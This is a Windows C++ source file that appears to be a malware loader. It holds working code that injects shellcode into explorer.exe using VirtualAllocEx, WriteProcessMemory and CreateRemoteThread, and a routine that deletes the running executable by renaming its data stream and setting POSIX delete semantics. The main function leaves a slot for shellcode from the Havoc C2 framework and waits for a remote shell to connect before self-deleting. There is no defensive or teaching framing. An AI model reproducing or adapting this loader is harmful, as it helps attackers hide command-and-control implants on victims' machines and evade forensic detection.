#include <windows.h>
#include <tlhelp32.h>
#include <string>

//===============================================================================================
// Part 1: Self-Deletion Logic
//===============================================================================================

typedef LONG NTSTATUS;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI* NtSetInformationFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass
);

#ifndef FILE_DISPOSITION_INFORMATION_EX
#define FILE_DISPOSITION_INFORMATION_EX struct _FILE_DISPOSITION_INFORMATION_EX
#define FileDispositionInformationEx ((INT)64)
#define FILE_DISPOSITION_DELETE 0x00000001
#define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002
FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
};
#endif

bool SelfDelete() {
    wchar_t szPath[MAX_PATH * 2] = { 0 };
    FILE_RENAME_INFO* pRename = nullptr;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        return false;
    }

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    const wchar_t* NewStream = L":gone";
    size_t sRename = sizeof(FILE_RENAME_INFO) + (wcslen(NewStream) * sizeof(wchar_t));
    pRename = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        CloseHandle(hFile);
        return false;
    }

    pRename->ReplaceIfExists = FALSE;
    pRename->RootDirectory = NULL;
    pRename->FileNameLength = wcslen(NewStream) * sizeof(wchar_t);
    memcpy(pRename->FileName, NewStream, pRename->FileNameLength);

    SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pRename);

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    NtSetInformationFile_t pNtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(hNtdll, "NtSetInformationFile");
    if (pNtSetInformationFile == NULL) {
        CloseHandle(hFile);
        return false;
    }
    
    FILE_DISPOSITION_INFORMATION_EX dispo = { 0 };
    dispo.Flags = FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS;

    IO_STATUS_BLOCK iosb = { 0 };
    pNtSetInformationFile(hFile, &iosb, &dispo, sizeof(dispo), FileDispositionInformationEx);
    
    CloseHandle(hFile);
    return true;
}


//===============================================================================================
// Part 2: Process Injection Logic
//===============================================================================================

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(processesSnapshot, &processInfo)) {
        if (processName == processInfo.szExeFile) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    while (Process32NextW(processesSnapshot, &processInfo)) {
        if (processName == processInfo.szExeFile) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

bool Inject(DWORD pid, unsigned char* shellcode, size_t shellcodeSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) return false;

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, shellcodeSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hRemoteThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hProcess);
    CloseHandle(hRemoteThread);
    return true;
}

//===============================================================================================
// Part 3: Main Execution Flow
//===============================================================================================

int main() {
    // --- STEP 1: SHELLCODE FROM C2 FRAMEWORK ---
    unsigned char shellcode[] = {
       // Paste your C-style shellcode array from Havoc here
    };
    
    // --- STEP 2: FIND A TARGET PROCESS AND INJECT ---
    DWORD targetPID = FindProcessId(L"explorer.exe");
    
    if (targetPID != 0) {
        if (Inject(targetPID, shellcode, sizeof(shellcode))) {
            // If injection succeeds, wait a moment for the shell to connect
            Sleep(2000); 
            // Then, delete the original executable
            SelfDelete();
        }
    }
    
    return 0;
}
